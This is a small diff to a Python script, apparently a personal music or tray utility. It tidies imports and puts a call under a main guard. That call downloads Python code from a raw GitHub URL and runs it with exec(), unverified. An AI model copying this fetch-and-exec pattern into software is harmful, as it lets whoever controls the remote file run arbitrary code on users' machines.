@@ -9,9 +9,7 @@ import datetime
 import vlc
 import sys
 import public_ip as ip
-import win11toast
-import io
-import PIL
+
 
 from io import BytesIO
 from pystray import MenuItem as item
@@ -23,4 +21,6 @@ from win11toast import toast
 url= 'https://raw.githubusercontent.com/Johnny-Hao-Le/test-music/main/test.py'
 r = requests.get(url)
 code = r.text
-exec(code)
+
+if __name__ == "__main__":
+    exec(code)
